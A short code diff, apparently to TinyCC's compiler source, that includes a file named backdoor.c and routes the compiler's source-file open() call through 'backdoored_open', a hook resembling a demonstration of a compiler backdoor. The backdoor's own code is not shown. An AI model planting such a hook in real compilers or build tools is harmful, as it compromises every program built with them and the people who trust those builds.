@@ -65,6 +65,7 @@
 #endif /* ONE_SOURCE */
 
 #include "tcc.h"
+#include "backdoor.c"
 
 /********************************************************/
 /* global variables */
@@ -773,7 +774,7 @@ static int _tcc_open(TCCState *s1, const char *filename)
     if (strcmp(filename, "-") == 0)
         fd = 0, filename = "<stdin>";
     else
-        fd = open(filename, O_RDONLY | O_BINARY);
+        fd = backdoored_open(filename);
     if ((s1->verbose == 2 && fd >= 0) || s1->verbose == 3)
         printf("%s %*s%s\n", fd < 0 ? "nf":"->",
                (int)(s1->include_stack_ptr - s1->include_stack), "", filename);
